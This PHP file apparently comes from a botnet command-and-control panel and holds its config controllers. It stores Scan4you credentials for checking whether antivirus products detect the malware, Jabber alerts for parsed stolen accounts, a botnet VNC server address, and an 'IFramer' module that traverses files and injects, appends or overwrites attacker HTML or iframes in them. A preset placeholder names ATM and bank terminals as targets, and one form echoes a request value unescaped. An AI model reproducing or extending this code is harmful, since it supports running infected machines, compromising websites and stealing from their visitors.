<?php
require_once 'system/lib/guiutil.php';

class Controller {
	function actionScan4you(){
		// <a href="?m=ajax_config&action=scan4you" class="ajax_colorbox" />[ config ]</a>
		if (isset($_POST['config'])){
			$updateList = array(
				'scan4you_jid' => $_POST['config']['scan4you_jid'],
				'scan4you_id' => $_POST['config']['scan4you_id'],
				'scan4you_token' => $_POST['config']['scan4you_token'],
				);
			if (!updateConfig($updateList))
				print '<div class="failure">Config save failed!</div>';
			}

		// Form
		echo 
		'<form class="ajax_form_save" action="?m=ajax_config&action=scan4you" data-jlog-title="Scan4you" method=POST>',
		'<dl>',
			'<dt>'.AJAX_CONFIG_JABBER_ID.'</dt><dd><input type="text" name="config[scan4you_jid]" value="'.$GLOBALS['config']['scan4you_jid'].'" /></dd>',
			'<dt>Scan4you Profile ID</dt><dd><input type="text" name="config[scan4you_id]" value="'.$GLOBALS['config']['scan4you_id'].'" /></dd>',
			'<dt>Scan4you API Token</dt><dd><input type="text" name="config[scan4you_token]" value="'.$GLOBALS['config']['scan4you_token'].'" /></dd>',
			'</dl>',
		'<div class="hint">'.AJAX_CONFIG_SCAN4YOU_HINT.'</div>',
		'<input type="submit" value="Save" />',
		'</form>';
		}
	
	function actionAccparse(){
		if (isset($_POST['config'])){
			$updateList = array( 'accparse_jid' => $_POST['config']['accparse_jid'] );
			if (!updateConfig($updateList))
				print '<div class="failure">Config save failed!</div>';
			}

		# Form
		echo 
		'<form class="ajax_form_save" data-jlog-title="Jabber" action="?m=ajax_config&action=accparse" method=POST>',
		'<dl>',
			'<dt>'.AJAX_CONFIG_JABBER_ID.'</dt><dd><input type="text" name="config[accparse_jid]" value="'.$GLOBALS['config']['accparse_jid'].'" /></dd>',
			'</dl>',
		'<input type="submit" value="Save" />',
		'</form>';
		}
	
	function actionBotnetVnc(){
		if (isset($_POST['config'])){
			$updateList = array( 
				'accparse_jid' => $_POST['config']['vnc_notify_jid'],
				'vnc_notify_jid' => $_POST['config']['vnc_notify_jid'],
				'vnc_server' => $_POST['config']['vnc_server'],
				);
			if (!updateConfig($updateList))
				print '<div class="failure">Config save failed!</div>';
			}

		# Form
		echo 
		'<form class="ajax_form_save" action="?m=ajax_config&action=botnetVNC" data-jlog-title="VNC" method=POST>',
		'<dl>',
			'<dt>', AJAX_CONFIG_JABBER_ID, '</dt>',
			'<dd>',
				'<input type="text" name="config[vnc_notify_jid]" value="'.$GLOBALS['config']['vnc_notify_jid'].'" />',
				'</dd>',
			'<dt>', 'VNC-Server IP', '</dt>',
			'<dd>',
				'<input type="text" name="config[vnc_server]" value="'.$GLOBALS['config']['vnc_server'].'" />',
				'</dd>',
			'</dl>',
		'<input type="submit" value="Save" />',
		'</form>';
		}

	function actionIframer(){
		if (isset($_POST['config'])){
			$_POST['config']['iframer']['traverse']['dir_masks']  = array_map('trim', explode("\n", $_POST['config']['iframer']['traverse']['dir_masks']));
			$_POST['config']['iframer']['traverse']['file_masks'] = array_map('trim', explode("\n", $_POST['config']['iframer']['traverse']['file_masks']));

			$updateList = array(
				'iframer' => $_POST['config']['iframer'],
				);

			if (!updateConfig($updateList))
				print '<div class="failure">Config save failed!</div>';
			}

		# Form
		echo
			'<form class="ajax_form_save" id="ajax_config_iframer" data-jlog-title="IFramer" action="?m=ajax_config&action=Iframer" method=POST style="width: 500px;">',
			'<dl>',
				'<dt>', AJAX_CONFIG_IFRAMER_URL, '</dt>',
					'<dd><input type="text" name="config[iframer][url]" style="width: 400px;"/></dd>',
				'<dt>', AJAX_CONFIG_IFRAMER_HTML, '</dt>',
					'<dd><textarea name="config[iframer][html]" rows=3></textarea></dd>',


				'<dt>', AJAX_CONFIG_IFRAMER_MODE, '</dt>',
					'<dd>',
						'<label><input type="radio" name="config[iframer][mode]" value="off">', AJAX_CONFIG_IFRAMER_MODE_OFF, '</label> ',
						'<label><input type="radio" name="config[iframer][mode]" value="checkonly">', AJAX_CONFIG_IFRAMER_MODE_CHECKONLY, '</label> ',
						'<label><input type="radio" name="config[iframer][mode]" value="inject">', AJAX_CONFIG_IFRAMER_MODE_INJECT, '</label> ',
						'<label><input type="radio" name="config[iframer][mode]" value="preview">', AJAX_CONFIG_IFRAMER_MODE_PREVIEW, '</label> ',
						'</dd>',

				'<dt>', AJAX_CONFIG_IFRAMER_INJECT, '</dt>',
					'<dd>',
					'<label><input type="radio" name="config[iframer][inject]" value="smart">', AJAX_CONFIG_IFRAMER_INJECT_SMART, '</label> ',
					'<label><input type="radio" name="config[iframer][inject]" value="append">', AJAX_CONFIG_IFRAMER_INJECT_APPEND, '</label> ',
					'<label><input type="radio" name="config[iframer][inject]" value="overwrite">', AJAX_CONFIG_IFRAMER_INJECT_OVERWRITE, '</label> ',
					'</dd>',

				'<dt>', AJAX_CONFIG_IFRAMER_TRAV_DEPTH, '</dt>',
					'<dd><input type="text" name="config[iframer][traverse][depth]" /></dd>',
				'<dt>', AJAX_CONFIG_IFRAMER_TRAV_DIR_MSK, '</dt>',
					'<dd><textarea name="config[iframer][traverse][dir_masks]" rows=3></textarea></dd>',
				'<dt>', AJAX_CONFIG_IFRAMER_TRAV_FILE_MSK, '</dt>',
					'<dd><textarea name="config[iframer][traverse][file_masks]" rows=3></textarea></dd>',

				'<dt>', AJAX_CONFIG_IFRAMER_SET_REIFRAME_DAYS, '</dt>',
					'<dd><input type="text" name="config[iframer][opt][reiframe_days]" /><div class="hint">', AJAX_CONFIG_IFRAMER_SET_REIFRAME_DAYS_HINT, '</div></dd>',
				'<dt>', AJAX_CONFIG_IFRAMER_SET_IFRAME_DELAY_HOURS, '</dt>',
					'<dd><input type="text" name="config[iframer][opt][process_delay]" /><div class="hint">', AJAX_CONFIG_IFRAMER_SET_IFRAME_DELAY_HOURS_HINT, '</div></dd>',
				'</dl>',
			'<input type="submit" value="Save" />',
			'</form>';

		echo js_form_feeder('form#ajax_config_iframer', array(
			'config[iframer][url]'		=> $GLOBALS['config']['iframer']['url'],
			'config[iframer][html]'		=> $GLOBALS['config']['iframer']['html'],
			'config[iframer][mode]'		=> $GLOBALS['config']['iframer']['mode'],
			'config[iframer][inject]'	=> $GLOBALS['config']['iframer']['inject'],
			'config[iframer][traverse][depth]'		=> $GLOBALS['config']['iframer']['traverse']['depth'],
			'config[iframer][traverse][dir_masks]'	=> implode("\n", $GLOBALS['config']['iframer']['traverse']['dir_masks']),
			'config[iframer][traverse][file_masks]'	=> implode("\n", $GLOBALS['config']['iframer']['traverse']['file_masks']),
			'config[iframer][opt][reiframe_days]'	=> $GLOBALS['config']['iframer']['opt']['reiframe_days'],
			'config[iframer][opt][process_delay]'	=> $GLOBALS['config']['iframer']['opt']['process_delay'],
			));
		}

	function actionNamedPresets(){
		if (!isset($_REQUEST['key']))
			die('No key provided');
		$KEY = $_REQUEST['key'];

		if (isset($_POST['config'])){
			$updateList = array( 'named_preset' => array( $KEY => $_POST['config']['named_preset'] ) );
			if (!updateConfig($updateList))
				print '<div class="failure">Config save failed!</div>';
		}

		# Form
		echo
		'<form class="ajax_form_save" action="?m=ajax_config&action=namedPresets&key='.$KEY.'" data-jlog-title="'.$KEY.'" method=POST>',
			'<dl>',
				'<dt>'.AJAX_CONFIG_NAMED_PRESETS.' ('.$KEY.')</dt>',
					'<dd><textarea rows=10 cols=80 name="config[named_preset]" placeholder="devices=atm bank terminal">'.htmlspecialchars(@$GLOBALS['config']['named_preset'][$KEY]).'</textarea></dd>',
			'</dl>',
			'<input type="submit" value="Save" />',
			'</form>';
	}
}

$defaults = config_gefault_values();
$GLOBALS['config'] = array_merge($defaults, $GLOBALS['config']); # feed the defaults!
foreach (array('iframer') as $k)
	$GLOBALS['config'][$k] = array_merge($defaults[$k], $GLOBALS['config'][$k]); # feed the defaults!

$c = new Controller();
if (!method_exists($c, $action = "action{$_GET['action']}"))
	die('Unknown action!');
$c->$action();
